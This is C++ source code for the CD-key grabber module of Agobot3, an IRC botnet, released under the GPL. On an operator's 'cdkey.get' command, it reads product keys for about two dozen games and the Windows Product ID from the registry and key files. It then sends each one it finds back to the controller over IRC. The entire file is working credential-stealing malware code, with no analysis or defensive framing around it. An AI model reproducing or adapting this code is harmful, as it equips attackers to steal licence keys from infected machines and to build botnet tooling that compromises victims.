/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

/*
	The grabber supports the following games:

	1.	Half-Life
	2.	Counter-Strike
	3.	Legends of Might and Magic
	4.	Unreal Tournament 2003
	5.	The Gladiators
	6.	Need For Speed Hot Pursuit 2
	7.	FIFA 2002
	8.	FIFA 2003
	9.	NHL 2002
	10.	NHL 2003
	11.	Nascar Racing 2002
	12.	Nascar Racing 2003
	13.	Battlefield 1942
	14.	Battlefield 1942 The Road to Rome
	15.	Battlefield 1942 Secret Weapons of WWII
	16.	Command & Conquer Generals
	17.	Project IGI 2
	18. Red Alert
	19.	Red Alert 2
	20.	Tiberian Sun
	21.	NOX
	22.	Neverwinter Nights
	23.	Soldier of Fortune II
	24. Chrome
	25.	Hidden and Dangerous 2
	26.	Windows Product ID
*/

#include "main.h"
#include "mainctrl.h"
#include "cdkeygrab.h"

void CCDKeyGrab::Init()
{	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGet,  		"cdkey.get",		"makes the bot get a list of cdkeys",				this); }

bool CCDKeyGrab::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("cdkey.get"))
	{
#ifdef WIN32
		/*
				Half-Life CDKey
		*/

		HKEY hkey=NULL; DWORD dwSize=128; unsigned char szDataBuf[128];
		LONG lRet=RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Key", NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Half-Life CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Counter-Strike CDKey
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\Counter-Strike\\Settings", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Counter-Strike CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Legends of Might and Magic
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\3d0\\Status", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "CustomerNumber", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found LoMaM CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				UT2003 CDKey
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Unreal Technology\\Installed Apps\\UT2003", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
		{	while(true)
			{	if(strstr((const char *)&szDataBuf[0], "XX22V-79HEN-BBQ46-4H7A9")) break;
				if(strstr((const char *)&szDataBuf[0], "MAMBC-G82JY-A9ZAP-89U4G")) break;
				if(strstr((const char *)&szDataBuf[0], "LYR22-RZ743-A9D7T-CNNEN")) break;
				g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
					"Found UT2003 CDKey (%s).", szDataBuf);
				break; } }
		RegCloseKey(hkey);

		/*
				The Gladiators
		*/
		
		dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Eugen Systems\\The Gladiators",0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "RegNumber", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found The Gladiators CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Need For Speed Hot Pursuit 2
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found NFSHP2 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				FIFA 2002
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found FIFA 2002 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				FIFA 2003
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found FIFA 2003 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				NHL 2002
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found NHL 2002 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				NHL 2003
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found NHL 2003 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Nascar Racing 2002
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Nascar 2002 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Nascar Racing 2003
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Nascar 2003 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Battlefield 1942
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found BF1942 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Battlefield 1942 The Road to Rome
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found BF1942 RtR CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Battlefield 1942 Secret Weapons of WWII
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found BF1942 SWoWWII CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Command & Conquer Generals
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Generals\\ergc", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Command & Conquer Generals CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Project IGI 2
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\IGI 2 Retail\\CDKey", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Project IGI 2 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Red Alert
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Westwood\\Red Alert", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Red Alert CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Red Alert 2
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Westwood\\Red Alert 2", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Red Alert 2 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Tiberian Sun
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Westwood\\Tiberian Sun", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Tiberian Sun CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				NOX
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Westwood\\Nox", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Serial", NULL, NULL, szDataBuf, &dwSize)==ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found NOX CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Neverwinter Nights CDKey
		*/

		char line[100]; dwSize=1024; unsigned char szDataBuf2[1024];
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "Location", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
		{	FILE *fp; char *szPath=(char*)malloc(1060);
			sprintf(szPath, "%s\\%s", szDataBuf2, "nwncdkey.ini");

			if((fp=fopen(szPath,"r"))!=NULL)
			{	while(fgets(line,100,fp)) {
					if(strstr(line, "Key1="))
					{	strtok(line, "=");
						g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
							"Found NWN CDKey (%s).", strtok(NULL, "=")); } }
				fclose(fp); }
			if(szPath) free(szPath); }
		RegCloseKey(hkey);

		/*
				Soldier of Fortune II
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
		{	char *szPath = (char*)malloc(MAX_PATH); FILE *fp;
			sprintf(szPath, "%s\\base\\mp\\%s", szDataBuf2, "sof2key");

			if((fp=fopen(szPath,"r"))!=NULL)
			{	if(fgets(line, 100, fp))
					if(!strstr(line, "mtkwftmkemfew3p3b7"))
					{	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
							"Found SOF2 CDKey (%s).", line); }
				fclose(fp); }
			if(szPath) free(szPath); }
		RegCloseKey(hkey);

		/*
				Chrome
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Techland\\Chrome", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "SerialNumber", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Chrome CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Hidden and Dangerous 2
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Illusion Softworks\\Hidden & Dangerous 2", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Hidden and Dangerous 2 CDKey (%s).", szDataBuf);
		RegCloseKey(hkey);

		/*
				Windows Product ID
		*/

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "ProductId", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
				"Found Windows Product ID (%s).", szDataBuf);
		RegCloseKey(hkey);
#endif // WIN32
	}
	return true; }
